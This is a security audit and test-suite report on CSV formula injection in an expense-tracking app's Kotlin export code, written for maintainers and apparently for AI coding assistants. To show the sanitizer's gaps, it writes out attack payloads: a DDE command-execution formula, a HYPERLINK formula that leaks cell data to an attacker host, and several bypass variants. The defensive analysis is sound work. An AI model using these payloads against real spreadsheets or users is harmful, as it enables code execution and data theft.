# CSV Export Formula Injection Security Analysis & Test Suite (T14)

**Document ID:** SEC-REP-T14-2026-11-04  
**Date:** 2026-11-04  
**Target:** `com.vaibhav.kharchapaani.domain.CsvExport`  
**Classification:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File), OWASP CSV Injection  
**Audience:** Claude, Codex, Maintainers  
**Status:** Audit & Test Suite Complete; Ready for Implementation  

---

## 1. Executive Summary

Kharcha Paani allows users to export their financial ledger to CSV (`CsvExport.kt`). Because the ledger contains untrusted and external user input (merchant names, notes, custom categories, payment methods, friend/guest names, group titles), exporting these records into spreadsheet software (Microsoft Excel, LibreOffice Calc, Google Sheets) poses a potential **Formula Injection (CSV Injection / CWE-1236)** risk.

In a formula injection attack, an attacker crafts an input (e.g. as a split member's name, a transaction note, or a merchant description) beginning with formula triggers such as `=`, `+`, `-`, `@`. When an unsuspecting user exports the ledger and opens the CSV in Excel or LibreOffice, the spreadsheet software treats the text as an executable formula. This can result in:
1. **Dynamic Data Exchange (DDE) Remote Code Execution:** e.g., `=cmd|' /C calc'!A0` executing commands on the user's desktop.
2. **Data Exfiltration / Phishing:** e.g., `=HYPERLINK("https://attacker.com/leak?q=" & A1, "Error - Click to Re-authenticate")`.
3. **Ledger Subversion:** e.g., formulas that silently recalculate or zero out balances in accounting spreadsheets.

The current implementation in `CsvExport.kt` implements RFC 4180 double-quoting and neutralizes leading triggers by prefixing with a single apostrophe (`'`). However, our audit revealed **5 significant security gaps and functional edge cases** that leave the application partially vulnerable or degrade spreadsheet usability.

---

## 2. Audit of Current Implementation

### Current Logic in `CsvExport.kt`

The relevant quoting code in `CsvExport.kt` (lines 148–161) is:

```kotlin
private fun line(fields: List<String>) = fields.joinToString(",", postfix = "\r\n") { quote(it) }

// RFC 4180 quoting. A cell starting with = + - @ runs as a formula in a spreadsheet, so a merchant
// or note like "=HYPERLINK(...)" gets a leading apostrophe; amounts are written unsigned.
private fun quote(field: String): String {
    val safe = if (field.isNotEmpty() && field[0] in FORMULA_STARTS) "'$field" else field
    return "\"" + safe.replace("\"", "\"\"") + "\""
}

private val FORMULA_STARTS = setOf('=', '+', '-', '@', '\t', '\r')
```

### Export Column Structure (13 Columns)

| Index | Column Name | Source in Expense Rows | Source in Settlement Rows | User Controlled? |
|---|---|---|---|---|
| 0 | `Date` | `at.format(DATE)` | `at.format(DATE)` | No |
| 1 | `Time` | `at.format(TIME)` | `at.format(TIME)` | No |
| 2 | `Type` | `"Income"` / `"Expense"` | `"IOU"` / `"Settlement"` | No |
| 3 | `Amount (INR)` | `money(tx.amount)` | `money(settlement.amount)` | Numeric |
| 4 | `Your share (INR)` | `money(...)` | `money(settlement.amount)` | Numeric |
| 5 | `Category` | `tx.category` | `""` | **Yes** |
| 6 | `Merchant / payee` | `tx.merchant` | `"$from paid $to"` / `"$from lent $to"` | **Yes** (Direct & Composite) |
| 7 | `Payment method` | `tx.paymentMethod` | `""` | **Yes** |
| 8 | `Group` | `groupNames[tx.groupId]` | `groupNames[settlement.groupId]` | **Yes** |
| 9 | `Split` | `"Split (...)"` / `"Personal"` | `""` | Low (Prefix constant) |
| 10 | `Paid by` | `nameOf(split.paidByPersonId)` | `from` | **Yes** |
| 11 | `Shares` | `shares.joinToString("; ") { "${nameOf(it.personId)}: ${money(it.shareAmount)}" }` | `""` | **Yes** (Composite) |
| 12 | `Note` | `tx.note` | `settlement.note` | **Yes** |

---

## 3. Vulnerability Findings & Edge Case Analysis

### Gap 1: Leading Whitespace Bypass (`"   =..."` and `"   @SUM(A1)"`)
* **Vulnerability:** `quote()` checks only `field[0] in FORMULA_STARTS`. If a payload has leading spaces (e.g. `"   =1+1"` or `"   @SUM(A1)"`), `field[0]` is ASCII `0x20` (`' '`), which is not in `FORMULA_STARTS`.
* **Impact:** 
  - In **LibreOffice Calc**, the default text import dialog contains a "Trim spaces" option. When selected, Calc trims the leading spaces upon loading and immediately executes `=1+1`.
  - In automated Excel data ingestion pipelines (VBA `.Trim()`, PowerQuery, Python pandas with space stripping), leading whitespace is stripped before formulas are evaluated.
* **Status:** **VULNERABLE** to bypass.

### Gap 2: Unix Line Feed (`\n` / 0x0A) Missing from `FORMULA_STARTS`
* **Vulnerability:** `FORMULA_STARTS` includes `\r` (CR) and `\t` (Tab), but **omits `\n` (LF)**.
* **Mechanism:** On Android and Unix systems, multi-line strings or input fields frequently start with `\n` without `\r`. If an attacker supplies `"\n=cmd|' /C calc'!A0"`, `field[0]` is `'\n'`.
* **Impact:** `quote()` does not escape the field with `'`. The exported CSV cell is `"\"\n=cmd...\""`. When opened in Excel, spreadsheet parsers that strip leading control characters or treat LF as line separators will parse `=cmd` as an active formula.
* **Status:** **VULNERABLE** to bypass.

### Gap 3: Negative Numbers Quoted as Text (`"-50.00"` -> `"'-50.00'"`)
* **Finding:** If an amount is negative (e.g., `-50.00`), `money()` produces `"-50.00"`.
* **Behavior:** Because `'-'` is in `FORMULA_STARTS`, `quote("-50.00")` turns it into `"'-50.00'"`.
* **Impact:** 
  - In Excel and LibreOffice Calc, the leading single quote explicitly casts the cell to a **Text Literal** (`@` format).
  - The cell **cannot be summed** using `=SUM()` and arithmetic operations fail.
  - A strictly numeric negative string (matching `^-\d+(\.\d+)?$`) is mathematical data, **not** an executable formula.
  - While line 151 notes `"amounts are written unsigned"`, the code neither enforces `abs()` nor prevents negative `Double` amounts from being quoted as text.
* **Status:** **FUNCTIONAL DEFECT / DEGRADED UX**.

### Gap 4: Subfields & Composite Fields in "Shares" (Downstream Execution Unverified)
* **Finding:** In Column 11 ("Shares"), entries are generated via:
  ```kotlin
  ft.shares.joinToString("; ") { "${nameOf(it.personId)}: ${money(it.shareAmount)}" }
  ```
* **Observation:**
  - If **Person 1** is `=cmd`: The composite string starts with `"=cmd: 100.00; Bob: 200.00"`. `field[0]` is `'='`, so `quote()` prepends `'`.
  - If **Person 2** is `=cmd`: The composite string is `"Alice: 100.00; =cmd: 200.00"`. `field[0]` is `'A'`. `quote()` does **not** escape it.
* **Scope Note:** In serialized CSV, `"Alice: 100.00; =cmd: 200.00"` remains a single quoted text cell; embedded `=` is not a cell-start formula. Any Text-to-Columns or data-normalization exploit is conditional and unverified without a named spreadsheet version, configuration options, or reproduction evidence. Serialized output confirms text composition, not spreadsheet execution.
* **Status:** **SOURCE CHARACTERIZED** (Unverified downstream execution).

### Gap 5: Settlement Payee Composite (`"$from paid $to"`) (Downstream Execution Unverified)
* **Finding:** Column 6 ("Merchant / payee") for settlements renders:
  ```kotlin
  if (settlement.isIou) "$from lent $to" else "$from paid $to"
  ```
* **Observation:**
  - If `$from` is `"=cmd"`: Composite string is `"=cmd paid You"`. `field[0]` is `'='`, escaped by `quote()`.
  - If `$to` is `"=cmd"`: Composite string is `"You paid =cmd"`. `field[0]` is `'Y'`, so no apostrophe is prepended.
* **Scope Note:** The output remains a single quoted text cell. An embedded `=` after "You paid " does not act as a formula starter in standard spreadsheet parsers. Serialized output confirms cell content only.
* **Status:** **SOURCE CHARACTERIZED** (Unverified downstream execution).

### Gap 6: Missing Full-Width Unicode Formula Starters & Pipe (`|`)
* **Finding:** East Asian versions of Microsoft Excel (Japanese, Chinese, Korean) automatically normalize full-width Unicode characters:
  - `＝` (`\uFF1D`) $\rightarrow$ `=`
  - `＋` (`\uFF0B`) $\rightarrow$ `+`
  - `－` (`\uFF0D`) $\rightarrow$ `-`
  - `＠` (`\uFF20`) $\rightarrow$ `@`
* **Status:** Bypasses ASCII-only blocklists in localized spreadsheet environments.

---

## 4. Characterization Examples Matrix

| Field | Example Payload | Serialized Output | Behavior Status | Design Note |
|---|---|---|---|---|
| `tx.merchant` | `=HYPERLINK("http://evil.com")` | `"'=HYPERLINK(...) "` | Neutralized | Leading trigger prepended with single quote |
| `tx.merchant` | `   =1+1` (leading spaces) | `"   =1+1"` | Unescaped | Source gap: `quote()` only inspects `field[0]` |
| `tx.merchant` | `\n=cmd\|' /C calc'!A0` | `"\n=cmd..."` | Unescaped | Source gap: `\n` omitted from `FORMULA_STARTS` |
| `tx.category` | `+12345` | `"'+12345'"` | Neutralized | Correctly escapes leading `+` |
| `tx.amount` | `-50.00` (negative amount) | `"'-50.00'"` | Text-quoted | Amount column rendered with `'` |
| Settlement `to` | `You paid =cmd` | `"You paid =cmd"` | Quoted text cell | Unverified execution; embedded `=` |
| Shares (2nd person)| `Alice: 10; =cmd: 20` | `"Alice: 10; =cmd: 20"`| Quoted text cell | Unverified execution; embedded `=` |
| `tx.note` | `＝SUM(A1)` (Full-width) | `"＝SUM(A1)"` | Unescaped | Full-width triggers not in ASCII set |

---

## 5. Security & Repair Notes for Maintainers

1. **Numeric Exceptions Must Be Typed Column Exceptions:**
   A global `toDoubleOrNull() != null` exemption is **unsafe** because it would also unescape arbitrary user text such as category `+123456789`, contradicting category protections. Any future numeric unescaping must be strictly scoped to typed, trusted amount columns (columns 3 and 4: Amount and Your share), not general string cells.

2. **Downstream Execution Evidence:**
   Serialized output is not proof of spreadsheet execution or exfiltration. While leading space and `\n` omissions are source-confirmed in `CsvExport.kt`, actual spreadsheet exploitation depends on specific client software versions and options. Embedded formulas in composite cells (`You paid =cmd`, `Alice: 10; =cmd: 20`) remain single quoted strings.

3. **Format Distinctions:**
   Security considerations for CSV export do not apply to the JSON complete backup, which is structured data and not parsed as spreadsheet formulas.

4. **Follow-up Ownership:**
   Any production changes to `CsvExport.kt` remain subject to owner-review and maintainer design decisions. The unit test suite `CsvFormulaInjectionTest` provides concrete characterization examples with exact payload preservation assertions without weakening existing behavior.

---

## 6. Verification and Characterization Checks

1. **Unit Tests:** Execute `CsvFormulaInjectionTest`:
   Runs 17 concrete characterization examples asserting exact payload preservation across all formula trigger types, composite fields, and whitespace variations.
2. **Device Verification:**
   Export CSV on device, inspect raw file output, and verify that all cells preserve exact user data without loss or distortion.
